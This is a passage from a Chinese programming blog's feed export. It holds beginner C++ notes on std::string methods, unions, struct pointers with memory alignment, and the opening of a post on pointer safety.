class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;0123456789&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; str.<span class="built_in">length</span>() &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>效果就是：<img src="/2022/05/24/string1/007.png" class=""><br>当然length的返回值也可以赋值给一个int类型的变量，以作重复使用。</p><blockquote><p>然后同样的问题，对中文的支持都是很玄学，毕竟各字符集对中文占用大小并不统一</p></blockquote><hr><h3 id=""><a href="#" class="headerlink" title="[]"></a>[]</h3><p>string也可以通过[]去访问字符串成员，下标依然0起，底层实现也是类似的，使用的内存空间也是连续的。<br>就没什么必要演示了</p><hr><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *ch = (<span class="type">char</span>*)<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="type">char</span> *ch1 = (<span class="type">char</span>*)<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(ch == ch1)</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;=&quot;</span> &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>在C语言里，字符串其实没有一个很准确的比较功能，像上述的代码中，能够判断也是因为二者的初始化时相当于使用了常量，而编译器恰好优化了常量，使常量的地址一致，所以才会判断相等<br>结果就是：<img src="/2022/05/24/string1/008.png" class=""></p><p>反汇编看两个初始值的情况</p><img src="/2022/05/24/string1/009.png" class=""><p>可以看到”123456“的十六进制值是相同的，所以比较的时候才相等。<br>但是这种比较方法很显然不靠谱。防止编译器优化的话，就需要其中一个字符串通过手动输入，这样就不能一下子确认为是常量。</p><p>但其实也有一个方法strcmp，不过就得借用string.h头文件了，也就是变相借助了工具，所以说原生下没有这种功能。<br><code>int strcmp(const char* str1，const char* str2);</code><br>返回值：</p><ul><li>如果返回值 &lt; 0，则表示 str1 小于 str2。</li><li>如果返回值 &gt; 0，则表示 str2 小于 str1。</li><li>如果返回值 &#x3D; 0，则表示 str1 等于 str2。</li></ul><p>而string的话，它肯定是内置了不少方法的:&#x3D;&#x3D; !&#x3D; &gt; &lt; &gt;&#x3D; &lt;&#x3D;<br>原则就是根据顺序，依次比较字符大小，在第一个字符就分出大小则就无视后面的字符，如果第一个字符相等就往后比较以此类推。</p><hr><h3 id="compare"><a href="#compare" class="headerlink" title="compare"></a>compare</h3><p>string类型自带的方法，返回值是int类型的值</p><ul><li>两个字符串完全相等返回0</li><li>相比比较的字符串小返回负数</li><li>相比比较的字符串大返回正数</li></ul><p>所以if的时候要注意，因为使用compare如果相等返回的是0，0在C语言cpp里面是表示假的。</p><p><code>.compare(index, end, str)</code>这是一个拓展的参数，可以指定被比较的字符串从哪里开始到哪里结束。</p><hr><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p><code>.find(str)</code>,find的返回值是一个整型，它可以找到str第一次出现的下标。</p><p>使用场景的话，最常用的就是substr的时候，找到原字符串内的某一块内容，用find当起始值。<br><code>.find(str,index)</code>  从要比较的字符串的index处包括index开始查找，返回值是std::string::npos 可能是-1或者4294967295<br><code>.find(str,index,end)</code> 从要被比较的字符串index处开始查找，范围是{str[0],str[end]}</p><hr><h3 id="rfind"><a href="#rfind" class="headerlink" title="rfind"></a>rfind</h3><p>这玩意。。就是倒着搜的find。<br>所以指定index的时候要从最后面开始，从0开始没遇到直接就罢工了。。<br>这玩意用的真的挺少的感觉。</p><hr><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>string的插入方法，参数小多<br><code>.insert(要插入的位置，要插入的字符串，要插入的字符串起始位置，要插入的大小);</code><br><code>.insert(要插入的位置，要插入的字符串，要插入的大小);</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;abc,&quot;</span>;</span><br><span class="line">str.<span class="built_in">insert</span>(<span class="number">3</span>,<span class="string">&quot;123&quot;</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure><hr><h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><p>string的内置方法，可以指定替换string中的内容<br><code>.replace(index, length, &quot;str&quot;)</code><br><code>.replace(index, length, &quot;char length&quot;, char)</code><br><code>.replace(起始位置，要替换长度，替换内容，替换后容节选长度)</code><br><code>.replace(起始位置，要替换长度，替换内容，替换后内容的起始位置，替换后容节选长度)</code></p><p>例一：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;id=001;&quot;</span>;</span><br><span class="line">str.<span class="built_in">replace</span>(<span class="number">3</span>, <span class="number">4</span>, <span class="string">&quot;003&quot;</span>);</span><br></pre></td></tr></table></figure><p>那么打印str之后的内容就会是<code>id=003</code></p><p>例二：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;abcde;&quot;</span>;</span><br><span class="line">str.<span class="built_in">replace</span>(<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="string">&#x27;*&#x27;</span>);</span><br></pre></td></tr></table></figure><p>那么打印str之后的内容就会是<code>abc******</code>;</p><p>例三：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;id=001;&quot;</span>;</span><br><span class="line">str.<span class="built_in">replace</span>(<span class="number">3</span>,<span class="number">4</span>,<span class="string">&quot;zhangsan;name=hhh;&quot;</span>,<span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>str为<code>id=zhangsan;</code></p><p>例四：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;id=001;&quot;</span>;</span><br><span class="line">str.<span class="built_in">replace</span>(<span class="number">3</span>,<span class="number">4</span>,<span class="string">&quot;zhangsan;name=hhh;&quot;</span>,<span class="number">5</span>,<span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>str为<code>id=san;</code></p><blockquote><p>其实后面几个用的也不多</p></blockquote><hr><h3 id="erase"><a href="#erase" class="headerlink" title=".erase"></a>.erase</h3><p>能替换，也能删除<br><code>.erase(删除的起始位置)</code><br><code>.erase(删除起始位置，删除的长度)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;id=001;&quot;</span></span><br><span class="line">str.<span class="built_in">erase</span>(<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>str显示为<code>id=</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;id=001;&quot;</span></span><br><span class="line">str.<span class="built_in">erase</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure><p>str显示为<code>id=</code></p><hr><h3 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h3><p>顾名思义就是清除，对应的就是清空字符串的内容。<br>就不演示了，反正使用了之后在打印字符串就是空的</p><hr><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p><code>string str = &quot;id=xxx;name=xxx;sex=x;phone=xxxxxxx;&quot;;</code><br>假设有这么一句字符串，需要你实现输入选项如id，拆解出id&#x3D;后面的参数，不含;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string str = <span class="string">&quot;id=1;name=hhh;sex=1;phone=110154654&quot;</span>;</span><br><span class="line">    string sIN,sOut;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;请输入查找关键字：\n&quot;</span>;</span><br><span class="line">    std::cin &gt;&gt; sIn;</span><br><span class="line">    <span class="type">int</span> flag = str.<span class="built_in">find</span>(<span class="string">&quot;sIn&quot;</span>+<span class="string">&quot;=&quot;</span>); <span class="comment">//加上等于才是完整的表达式</span></span><br><span class="line">    <span class="keyword">if</span>(flag == std::string::nopos)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;所查找关键字不存在！\n&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> len = str.<span class="built_in">find</span>(<span class="string">&quot;;&quot;</span>,flag);</span><br><span class="line">        sOut = str.<span class="built_in">substr</span>(flag + sIn.<span class="built_in">length</span>()+<span class="number">1</span>, len - flag - sIn.<span class="built_in">length</span>()<span class="number">-1</span>);</span><br><span class="line">        std::cout &lt;&lt; sOut &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>内置的方法还是香的，自己能造出轮子也不失为一种办法。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>union</title>
      <link href="/2022/05/23/union/"/>
      <url>/2022/05/23/union/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul><li><strong>union （共用声明和共用一变量定义）</strong></li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>union跟struct有相似的地方，但是union又叫做联合体或共用体，也就意味着它在内存存储上会和正常的有区别。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>写法和结构体差不多：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">unionName</span>&#123;</span><br><span class="line">    type <span class="keyword">typename</span>;</span><br><span class="line">    type <span class="keyword">typename</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>注意：union之间的成员共享内存，也就意味着union的内存占用会根据最大的成员而定义。</strong></p><hr><h2 id="No-1"><a href="#No-1" class="headerlink" title="No.1"></a>No.1</h2><p>首先自定义一个联合体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">hh</span>&#123;</span><br><span class="line"><span class="type">short</span> sh;</span><br><span class="line"><span class="type">int</span> in;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>先给实例一个hh，然后给小的变量赋值</p><img src="/2022/05/23/union/000.png" class=""><p>sizeof能看到是四个字节，也就是印证他会根据联合体里面最大的变量类型扩充。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">hh</span>&#123;</span><br><span class="line"><span class="type">short</span> sh;</span><br><span class="line"><span class="type">int</span> in;</span><br><span class="line"><span class="type">double</span> dou;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在联合体里再放一个double类型</p><img src="/2022/05/23/union/001.png" class=""><p>发现结构体H的占用大小变成了8字节。</p><blockquote><p>可以确定联合体的内存大小由最大成员定义</p></blockquote><hr><h2 id="No-2"><a href="#No-2" class="headerlink" title="No.2"></a>No.2</h2><p>那么说联合体共享内存空间，那么给short类型变量赋值之后，int和double会不会也是跟short变量一样的值？</p><img src="/2022/05/23/union/002.png" class=""><p>显然是不一样的。</p><p>乱码的情况大多是没有初始化，如果说给其他成员尝试初始化呢<br>但是要注意联合体的初始化有点不一样。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">hh</span>&#123;</span><br><span class="line"><span class="type">short</span> sh;</span><br><span class="line"><span class="type">int</span> in;</span><br><span class="line"><span class="type">double</span> dou;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    hh H&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在实例化一个对象的时候直接初始化0看似没什么问题，但是由于联合体共享内存的特性，这个0初始化可能是给了第一个成员，后面的成员会不会初始化则不好说，况且不同的编译器还有一定的优化特性。</p><p>所以保守起见就手动初始化</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hh H;</span><br><span class="line">H.in = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>再手动初始化成员后，能看到</p><img src="/2022/05/23/union/003.png" class=""><p>in的值变成和sh的值一样，但是这个是in初始化在前，sh赋值在后，如果调换一下位置</p><img src="/2022/05/23/union/004.png" class=""><p>会发现成员的值是会根据最后一次赋值而改变。</p><hr><h2 id="No-3"><a href="#No-3" class="headerlink" title="No.3"></a>No.3</h2><p>short占用两字节，int占用四字节，如果是一个负数，在short和int下又会发生不一样的解读</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hh H;</span><br><span class="line">H.in = <span class="number">0</span>;</span><br><span class="line">H.sh = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sizeof</span>(H) &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; H.sh &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; H.in &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/23/union/005.png" class=""><p>short的 -1 原码表示 <code>1000 0000 0000 0001</code>，反码<code>1111 1111 1111 1110</code>，补码<code>1111 1111 1111 1111</code>,十六进制合计0xffff。无非就是表示-1或65535<br>但是int占四字节，0xffff在int里就不会是一个负数。</p><hr><h2 id="No-4"><a href="#No-4" class="headerlink" title="No.4"></a>No.4</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; &amp;H.sh &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;H.in &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/23/union/006.png" class=""><p>再看地址是一样的，也就是说共享了内存地址。</p><hr><h1 id="匿名结构体和联合体"><a href="#匿名结构体和联合体" class="headerlink" title="匿名结构体和联合体"></a>匿名结构体和联合体</h1><p>匿名自然就是不声明类型名称</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">short</span> sh;</span><br><span class="line"><span class="type">int</span> in;</span><br><span class="line"><span class="type">double</span> dou;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当然直接声明好似没什么意义，编译器也会给出报错</p><img src="/2022/05/23/union/007.png" class=""><p>但是我们知道结构体能在}后面提前定义变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">short</span> sh;</span><br><span class="line"><span class="type">int</span> in;</span><br><span class="line"><span class="type">double</span> dou;</span><br><span class="line">&#125;un;</span><br></pre></td></tr></table></figure><p>un自然也能进行赋值之类的操作，但是没有复用性，下次还想实例一个un结构类型的联合体只能重新定义一个联合体在实例化就会变得很麻烦。</p><p>所以匿名联合体的场景自然是不复用的前提下，比如嵌套在某处</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">st</span>&#123;</span><br><span class="line"><span class="keyword">union</span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">char</span> b;</span><br><span class="line"><span class="type">double</span> c;</span><br><span class="line">&#125;un;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这种情况下，联合体没必要复用，因为他就是结构体当中的成员，还可以给结构体节省点内存，毕竟三个成员不一定都用得上。</p><p>结构体同样能匿名，只不过使用前都得提前在后面声明一个变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">&#125;st;</span><br></pre></td></tr></table></figure><p>赋值操作也都一样的，还是那句话缺少了复用性，匿名联合体可以被嵌套在结构体了，那么匿名结构体也会有相应的嵌套场所，比如说类当中。</p><p>但是匿名的情况还算少的，所以了解个大概就行了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>莫的感情~都差不多</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>structPointer</title>
      <link href="/2022/05/21/structPointer/"/>
      <url>/2022/05/21/structPointer/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>结构体也不算陌生，特殊的是给结构体赋值的时候。</p><span id="more"></span><hr><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line">&#125;box,*PBox;</span><br></pre></td></tr></table></figure><p><code>typedef</code>是起到一个起别名的作用，例如我们声明<code>typedef int in;</code>，那么后面定义一个int变量的时候就可以<code>in a = 0;</code>。<br><code>struct</code>是声明结构体类型的关键字，在固有印象里结构体应该是这样的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HHH</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>定义一个HHH结构体时，我们可以用<code>HHH h;</code>或者<code>struct HHH h;</code><br>当我们在结构体后面放置额外的变量名时：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HHH</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125;h1,h2[<span class="number">10</span>],*h3;</span><br></pre></td></tr></table></figure><p>这个时候后面的三个变量名就是表面我们再创建结构体HHH的时候同时声明了三个HHH类型的变量，一个正常的HHH h1，一个长度为10的结构体数组，以及一个指向这种结构体的指针。</p><p>然后回到我们刚开始说的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line">&#125;box,*PBox;</span><br></pre></td></tr></table></figure><p>那么这个时候box还是一个提前定义的Box box变量吗？<br>答案肯定是否，因为typedef是起别名的作用，那么跟随在后的变量名，都将是结构体Box的小名。<br>*PBox理解就是<code>typedef Box *PBox</code>,说人话就是将Box的指针写法改名，声明变量的时候使用PBox xx,就可以不用再加*号。</p><img src="/2022/05/21/structPointer/000.png" class=""><p><strong>注意：别名起的跟结构体名称一致无意义，且指针类型时也不允许跟结构体重名</strong></p><hr><h1 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h1><p>大致回忆一下结构体的用法</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line">&#125;box,*PBox;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">box b;</span><br><span class="line"><span class="comment">//Box b1;</span></span><br><span class="line"><span class="comment">//struct Box b2;</span></span><br><span class="line">PBox pb;</span><br><span class="line"></span><br><span class="line">pb-&gt;a = <span class="number">10</span>;</span><br><span class="line">pb-&gt;b = <span class="number">20</span>;</span><br><span class="line">b.a = <span class="number">10</span>;</span><br><span class="line">b.b = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>b.a</code>是我们正常使用结构体访问成员的时候的用法，但是发现在指针的情况下，访问方式变成了<code>-&gt;</code>。<br>不过<code>-&gt;</code>这种方式在class的时候才会有更直观的体会，目前先不管，只需要知道指针类型结构体访问成员使用<code>-&gt;</code>即可。</p><hr><h2 id="结构体在反汇编下"><a href="#结构体在反汇编下" class="headerlink" title="结构体在反汇编下"></a>结构体在反汇编下</h2><img src="/2022/05/21/structPointer/001.png" class=""><p>这里有点有意思的就是能看到我们在源代码里是清清楚楚明明白白真真切切的声明了结构体，但是反汇编下却没有对于结构体的代码，要知道汇编是源代码翻译过来的产物。</p><p>大致上的理解可以认为结构体就是自定义变量类型，类似于int，char之类的，计算机在编译的时候不会翻出它们的源代码，但是计算机已经能知道它们所需要的空间。我们声明的box里面有两个int变量，int类型在内存占用四字节，所以计算机就会把前面的四字节认作为box.a，后四字节认为是box.b。</p><hr><h2 id="指针结构体的地址问题"><a href="#指针结构体的地址问题" class="headerlink" title="指针结构体的地址问题"></a>指针结构体的地址问题</h2><p>指针自然是需要申请地址或者指向一块地址，但是堆区的数据较为灵活，属于不确定率高的，而栈区则是有可能被查出的，或者说通过偏移量去计算。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">box b;</span><br><span class="line">Box b1;</span><br><span class="line">PBox pb = <span class="keyword">new</span> Box;</span><br><span class="line">PBox pb1 = &amp;b1;</span><br></pre></td></tr></table></figure><p>反汇编可能不会很明显，但是浅看地址偏移量看个大概吧</p><img src="/2022/05/21/structPointer/003.png" class=""><blockquote><p>首先就是new的时候反汇编的操作和后续给pb1赋值的时候ebp的偏移量和pb赋值的偏移量明显的差距。<br>最直观的就是new一个Box的时候，push了8，这就是两个int类型占用的大小</p></blockquote><p><strong>说到结构体大小，额外提一点内存对齐</strong></p><h3 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HHH</span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">short</span> c;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>问，HHH结构体占用大小，凭借朴素的情感，4+4+2 &#x3D; 10。答案是错的，因为内存的逻辑顺序就是连续，所以当出现两个int之后，又出现了一个short，编译器就会对short进行填充优化变成四个字节，至于填充的字节默认下不使用。<br>当然内存对齐的参照有很多，会根据不同操作系统类型，或者不同的对齐倍数设置和整体之间的参照，此处简单过一遍。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HHH</span>&#123;</span><br><span class="line"><span class="type">char</span> ch1;</span><br><span class="line"><span class="type">char</span> ch2;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">short</span> c;</span><br><span class="line"><span class="type">int</span> d;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>有兴趣也可以自己写然后计算一下，和sizeof做一个比较。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>结构体指针其实也没有太特殊，无非就是看重一点内存和访问方式吧。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pointer安全</title>
      <link href="/2022/05/20/pointerText/"/>
      <url>/2022/05/20/pointerText/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对指针已经有了大致了解，那么对于指针的安全性也需要有一定把握</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> *a = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br><span class="line">        p = a;</span><br><span class="line">        p[<span class="number">0</span>] = <span class="number">250</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么当指针p new的内存没有delete的时候，分配到的内存还会存在吗？<br>可以通过输出p[0]的值看看<img src="/2022/05/20/pointerText/000.png" class=""><br>发现仍然有值，这个时候这个指针p就被称为悬挂指针，也就是常说的野指针。</p><blockquote><p>解决这种粗心的办法可以用智能指针</p></blockquote><hr><h2 id="No-1"><a href="#No-1" class="headerlink" title="No.1"></a>No.1</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 